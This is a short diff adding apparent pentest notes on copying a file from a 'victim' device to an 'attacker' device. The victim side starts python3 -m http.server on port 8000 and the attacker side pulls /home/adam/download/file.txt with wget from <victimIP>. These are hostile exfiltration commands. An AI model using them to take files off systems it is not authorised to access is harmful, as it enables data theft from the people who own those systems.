@@ -1,0 +1,9 @@
+=> How to download file from victim device to attacker device.
+
+exmaple file location=>/home/adam/download/file.txt
+
+Victim computer => kali> python3 -m http.server 8000 {enter}
+serving http on 0.0.0.0 port 8000 (http://0.0.0.0:8000)
+
+
+Attacker computer => wget http://<victimIP>:8000/home/adam/download/file.txt {enter}
